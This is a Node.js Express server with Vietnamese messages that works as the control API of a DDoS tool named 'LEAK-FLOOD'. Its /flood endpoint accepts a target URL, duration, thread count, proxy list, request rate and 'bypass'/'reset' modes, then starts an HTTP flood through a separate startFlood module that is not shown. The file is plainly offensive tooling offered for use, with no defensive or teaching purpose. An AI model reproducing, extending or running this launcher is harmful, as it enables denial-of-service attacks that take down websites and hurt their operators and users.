const express = require('express');
const { startFlood } = require('./flood');
const os = require('os');
const fs = require('fs');
const net = require('net');
const cluster = require('cluster');

if (cluster.isMaster) {
    const app = express();
    app.use(express.json());

    const MAX_THREADS = os.cpus().length - 2;
    let isFlooding = false;

    const log = (...args) => {
        process.stdout.write(
            "[LOG] " + args.map(a =>
                (typeof a === "object" ? JSON.stringify(a) : String(a))
            ).join(" ") + "\n",
            () => process.stdout.emit("flush")
        );
    };

    function findFreePort(startPort, callback) {
        const server = net.createServer();
        server.once('error', (err) => {
            if (err.code === 'EADDRINUSE') {
                log(`[ERROR] Cổng ${startPort} đang được sử dụng, thử cổng ${startPort + 1}`);
                server.close();
                findFreePort(startPort + 1, callback);
            } else {
                log(`[ERROR] Lỗi tìm cổng: ${err.message}`);
                callback(startPort);
            }
        });
        server.once('listening', () => {
            const port = server.address().port;
            server.close();
            callback(port);
        });
        server.listen(startPort);
    }

    app.post('/flood', async (req, res) => {
        if (isFlooding) {
            return res.status(400).json({ error: "Flood đang chạy, vui lòng đợi hoàn thành" });
        }

        const { target, time, threads, proxyfile, ratelimit, debug, bypass, reset } = req.body;

        if (!target || !time || !threads || !ratelimit) {
            return res.status(400).json({
                error: "Thiếu các tham số bắt buộc: target, time, threads, ratelimit"
            });
        }

        try {
            new URL(target);
        } catch (e) {
            return res.status(400).json({ error: "URL mục tiêu không hợp lệ" });
        }

        const threadCount = parseInt(threads);
        if (isNaN(threadCount) || threadCount <= 0 || threadCount > MAX_THREADS) {
            return res.status(400).json({
                error: `Số thread phải từ 1 đến ${MAX_THREADS} (số lõi CPU - 2)`
            });
        }

        const duration = parseInt(time);
        if (isNaN(duration) || duration <= 0) {
            return res.status(400).json({ error: "Thời gian phải là số dương" });
        }

        const rate = parseInt(ratelimit);
        if (isNaN(rate) || rate <= 0) {
            return res.status(400).json({ error: "Ratelimit phải là số dương" });
        }

        if (proxyfile && !fs.existsSync(proxyfile)) {
            return res.status(400).json({ error: "File proxy không tồn tại" });
        }

        isFlooding = true;
        log(`[INFO] LEAK-FLOOD starting...`);
        log(`[INFO] Target: ${target}`);
        log(`[INFO] Duration: ${duration} seconds`);
        log(`[INFO] Threads: ${threadCount}`);
        log(`[INFO] Proxy file: ${proxyfile || 'không có'}`);
        log(`[INFO] Debug Mode: ${debug ? "ON" : "OFF"}`);
        if (bypass) log("[INFO] Bypass mode: ON");
        if (reset) log("[INFO] Reset mode: ON");

        res.json({ status: "Bắt đầu flood" });
        try {
            await startFlood(target, duration, threadCount, proxyfile, rate, debug, bypass, reset, () => {
                log(`[INFO] Hoàn thành flood cho mục tiêu: ${target}`);
                isFlooding = false;
            });
        } catch (err) {
            log(`[ERROR] Lỗi trong startFlood: ${err.message}`);
            isFlooding = false;
            res.status(500).json({ error: "Lỗi khi bắt đầu flood" });
        }
    });

    // Kiểm tra instance đang chạy
    const START_PORT = process.env.PORT || 3000;
    findFreePort(START_PORT, (port) => {
        app.listen(port, () => {
            log(`Server API đang chạy trên cổng ${port}`);
            log(`[INFO] Node.js version: ${process.version}`);
            log(`[INFO] CPU cores: ${os.cpus().length}`);
            log(`[INFO] Dependencies: express@${require('express/package.json').version}, hpack@${require('hpack/package.json').version}, randomstring@${require('randomstring/package.json').version}`);
            try {
                fs.accessSync('500.txt', fs.constants.R_OK);
                log(`[INFO] File 500.txt: Readable`);
            } catch (err) {
                log(`[ERROR] File 500.txt: ${err.message}`);
            }
        });
    });

    cluster.on('message', (worker, message) => {
        log(`[DEBUG] Master: Nhận tin nhắn từ Worker ${worker.id}: ${message}`);
    });
}